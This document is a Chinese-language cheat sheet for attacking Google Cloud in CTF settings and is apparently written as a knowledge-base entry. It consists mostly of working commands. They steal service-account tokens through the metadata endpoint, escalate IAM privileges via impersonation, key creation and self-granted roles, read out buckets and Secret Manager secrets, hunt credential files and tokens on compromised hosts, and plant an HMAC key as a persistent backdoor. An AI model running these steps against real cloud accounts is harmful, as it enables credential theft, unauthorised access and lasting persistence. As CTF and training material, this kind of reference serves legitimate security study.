---
category: cloud
tags: [gcp, google cloud, iam, storage, bucket, cloud functions, compute engine, secret manager, metadata, imds, 谷歌云, 云安全, 服务账号, 元数据, 提权]
triggers: [gcp, google cloud, gcloud, gsutil, metadata.google.internal, iam.gserviceaccount.com, cloudfunctions.net, run.app, storage.googleapis.com, compute engine, secret manager, cloud run, cloud functions, 169.254.169.254]
related: [cloud/aws_iam_enum, cloud/kubernetes_enum, cloud/aws_s3_enumeration, cloud/aws_lambda_enum, cloud/azure_basics]
---

# GCP 基础攻击速查

CTF 中遇到 GCP 环境时的快速侦察与利用参考。涵盖 IAM、Storage、Cloud Functions、Compute 元数据、Secret Manager 等核心服务。

## 什么时候用

- 题目环境运行在 GCP 上，或题目描述/源码中出现 `gcloud`、`gsutil`、`metadata.google.internal` 等关键词
- 拿到 GCP Service Account 密钥（JSON）或 OAuth token
- 通过 SSRF 可以访问 `metadata.google.internal`（GCP 的 IMDS）
- 题目涉及 Cloud Functions / Cloud Run 的未授权访问

## 前提条件

- 拥有 GCP 凭据（SA JSON key / OAuth token / gcloud 已认证会话）
- 或能通过 SSRF / 实例内部访问元数据服务
- `gcloud` CLI 已安装（容器内通常可用）

## 攻击步骤

### 0. 初始侦察 — 确认身份与项目

```bash
# 当前认证身份
gcloud auth list
gcloud config list

# 项目信息
gcloud projects list
gcloud organizations list

# 用 SA key 认证
gcloud auth activate-service-account --key-file=sa_cred.json
```

### 1. IMDS 元数据服务（metadata.google.internal）

GCP 元数据端点 **不需要特殊 Token**，只需 `Metadata-Flavor: Google` 头。SSRF 第一目标。

```bash
METADATA="http://metadata.google.internal/computeMetadata/v1"
HEADER="Metadata-Flavor: Google"

# 获取 SA access token（最高价值）
curl -s "$METADATA/instance/service-accounts/default/token" -H "$HEADER"

# 项目元数据（可能含 SSH key、启动脚本中的密码）
curl -s "$METADATA/project/attributes/?recursive=true&alt=text" -H "$HEADER"

# 实例元数据（自定义 key-value，可能含敏感信息）
curl -s "$METADATA/instance/attributes/?recursive=true&alt=text" -H "$HEADER"

# 实例所属项目/区域/SA
curl -s "$METADATA/project/project-id" -H "$HEADER"
curl -s "$METADATA/instance/zone" -H "$HEADER"
curl -s "$METADATA/instance/service-accounts/default/email" -H "$HEADER"
```

> **与 AWS 区别**：GCP IMDS v1 不需要先 PUT 获取 token，只需 `Metadata-Flavor` 头即可。无 IMDSv2 的 hop 限制。

### 2. IAM 枚举

```bash
# 列出 Service Accounts
gcloud iam service-accounts list --project <project>

# 列出 IAM 角色
gcloud iam roles list --project <project>
gcloud iam roles describe roles/container.admin

# 查看项目/组织 IAM 策略（谁有什么权限）
gcloud projects get-iam-policy <project-id>
gcloud organizations get-iam-policy <org-id>

# 用 cloudasset 枚举所有 IAM 绑定（强大）
gcloud asset search-all-iam-policies --scope projects/<project-id>

# 查看某个用户/SA 的所有权限
gcloud asset analyze-iam-policy --project=<project> \
    --identity='serviceAccount:xxx@xxx.iam.gserviceaccount.com'
```

### 3. IAM 提权路径

拿到 SA 后检查是否有以下高危权限：

| 权限 | 利用方式 |
|------|----------|
| `iam.roles.update` | 直接给自己的角色加权限 |
| `iam.serviceAccounts.getAccessToken` | 冒充高权限 SA 获取 token |
| `iam.serviceAccountKeys.create` | 为高权限 SA 创建永久密钥 |
| `iam.serviceAccounts.setIamPolicy` | 给自己授予 SA 的 tokenCreator 角色 |
| `iam.serviceAccounts.signBlob` | 伪造 JWT 冒充 SA |
| `iam.serviceAccounts.actAs` | 类似 AWS `iam:PassRole`，启动资源时附加 SA |

```bash
# 冒充 SA 获取 token
gcloud --impersonate-service-account="victim@proj.iam.gserviceaccount.com" \
    auth print-access-token

# 为 SA 创建密钥
gcloud iam service-accounts keys create --iam-account <sa-email> /tmp/key.json
gcloud auth activate-service-account --key-file=/tmp/key.json

# 给自己授予 tokenCreator
gcloud iam service-accounts add-iam-policy-binding \
    "victim@proj.iam.gserviceaccount.com" \
    --member="user:attacker@domain.com" \
    --role="roles/iam.serviceAccountTokenCreator"
```

### 4. Storage Bucket 枚举与利用

```bash
# 列出所有 bucket
gsutil ls
gsutil ls -L  # 详细配置

# 列出 bucket 内容
gsutil ls -r gs://bucket-name/
gsutil ls -a gs://bucket-name/  # 包含历史版本（可能有删除的敏感文件）

# 读取文件
gsutil cat gs://bucket-name/path/to/file
gsutil cp gs://bucket-name/secret.txt ./

# 用 raw token 访问（gsutil 不支持某些 token 传递方式时）
curl -H "Authorization: Bearer $TOKEN" \
    "https://storage.googleapis.com/storage/v1/b/<bucket>/o"
curl -H "Authorization: Bearer $TOKEN" \
    "https://storage.googleapis.com/storage/v1/b/<bucket>/o/<object>?alt=media" --output -

# 查看 bucket IAM
gcloud storage buckets get-iam-policy gs://bucket-name/
```

**公开 bucket URL 格式**：
- `https://storage.googleapis.com/<bucket-name>`
- `https://<bucket-name>.storage.googleapis.com`

**高价值 bucket**：
- Cloud Functions 源码：`gcf-sources-<number>-<region>/`
- Container Registry 镜像：`artifacts.<project>.appspot.com`
- Composer DAGs：含 Airflow 工作流代码

### 5. Cloud Functions 枚举与利用

```bash
# 列出函数
gcloud functions list
gcloud functions describe <func_name>

# 查看 IAM（是否允许未认证调用）
gcloud functions get-iam-policy <func_name>

# 查看日志（可能泄露环境变量/敏感信息）
gcloud functions logs read <func_name> --limit 50

# 调用函数
curl https://<region>-<project>.cloudfunctions.net/<func_name>

# 需要认证的函数
curl -H "Authorization: bearer $(gcloud auth print-identity-token)" \
    https://<region>-<project>.cloudfunctions.net/<func_name>
```

**关键点**：
- 默认 SA 是 App Engine Default SA（Editor 权限，权限很高）
- 代码存储在 GCS bucket 中，有读权限就能获取源码
- URL 格式：`https://<region>-<project>.cloudfunctions.net/<func_name>`

### 6. Cloud Run 枚举

```bash
# 列出服务
gcloud run services list
gcloud run services describe --region <region> <svc-name>

# 查看 IAM
gcloud run services get-iam-policy --region <region> <svc-name>

# 列出版本
gcloud run revisions list --region <region>

# 调用
curl <url>
curl -H "Authorization: Bearer $(gcloud auth print-identity-token)" <url>

# 列出 Jobs
gcloud beta run jobs list
```

**关键点**：
- 默认 SA 是 Compute Engine default SA（Editor + cloud-platform scope）
- 可能配置了明文环境变量或挂载了 Cloud Secrets
- URL 格式：`https://<svc-name>-<random>.a.run.app`

### 7. Secret Manager

```bash
# 列出所有 secret
gcloud secrets list

# 查看 secret 的 IAM 策略
gcloud secrets get-iam-policy <secret_name>

# 列出版本并读取明文
gcloud secrets versions list <secret_name>
gcloud secrets versions access latest --secret="<secret_name>"
```

### 8. Compute 实例内本地提权

在已拿到 shell 的 Compute 实例内：

```bash
# 搜索 gcloud 凭据文件
find / -name "credentials.db" 2>/dev/null
find / -path "*gcloud/legacy_credentials*" 2>/dev/null
ls ~/.config/gcloud/

# 搜索 SA key 文件
grep -Prl '"type":\s*"service_account"' / 2>/dev/null

# 搜索 API Key
grep -Pr "AIza[a-zA-Z0-9\-_]{35}" /home/ /tmp/ /var/ 2>/dev/null

# 搜索 OAuth token
grep -Pr "ya29\.[a-zA-Z0-9_-]{100,200}" /home/ /tmp/ 2>/dev/null

# 检查启动脚本（可能含密码）
curl -s "http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script" \
    -H "Metadata-Flavor: Google"
```

## 常见坑

1. **gsutil vs gcloud 认证**：`gsutil` 不支持 `CLOUDSDK_AUTH_ACCESS_TOKEN` 环境变量，需要用 `curl` + Bearer token 直接访问 Storage API
2. **默认 SA 权限高但 scope 受限**：Compute Engine 默认 SA 有 Editor 角色，但默认 access scope 只有 `devstorage.read_only` 等有限权限。需要 `cloud-platform` scope 才能完整利用
3. **set-iam-policy vs add-iam-policy-binding**：`set-iam-policy` 会**覆盖**所有现有绑定，操作前先 `get-iam-policy` 备份；`add-iam-policy-binding` 只追加
4. **Bucket ACL 90 天锁定**：创建 bucket 90 天后若一直使用 IAM 模式，则 ACL 将永久不可启用
5. **IMDS 头强制**：GCP IMDS 强制要求 `Metadata-Flavor: Google` 头，部分 SSRF 场景下可能无法添加自定义头

## 变体

### 渗透测试专用权限配置

申请 GCP 渗透测试权限时的最小角色集：

```bash
roles/viewer
roles/iam.securityReviewer
roles/resourcemanager.folderViewer
roles/resourcemanager.organizationViewer
```

需启用的关键 API：

```bash
gcloud services enable \
    iam.googleapis.com \
    compute.googleapis.com \
    storage.googleapis.com \
    cloudfunctions.googleapis.com \
    run.googleapis.com \
    cloudresourcemanager.googleapis.com \
    cloudasset.googleapis.com \
    secretmanager.googleapis.com
```

### HMAC Key 持久化

获得 `storage.hmacKeys.create` 权限后，可为 SA 创建永久 HMAC key：

```bash
gsutil hmac create sa@project.iam.gserviceaccount.com
# 记录 Access ID 和 Secret，可作为持久后门
gcloud config set pass_credentials_to_gsutil false
gsutil config -a  # 配置 HMAC 认证
```

### OpenID Token 冒充

用 `iam.serviceAccounts.getOpenIdToken` 生成 Identity Token 访问 Cloud Run / Cloud Functions：

```bash
gcloud auth print-identity-token "sa@proj.iam.gserviceaccount.com" \
    --audiences=https://target-service.a.run.app
```

## 相关技术

- [[cloud/aws_iam_enum]] — AWS IAM 枚举，GCP IAM 概念类似但语法不同
- [[cloud/kubernetes_enum]] — GKE 集群底层是 K8s，拿到 node 后可以 pivot 到 K8s
- [[cloud/aws_s3_enumeration]] — 与 GCS Bucket 攻击手法类似
- [[cloud/aws_lambda_enum]] — 与 Cloud Functions 概念对应
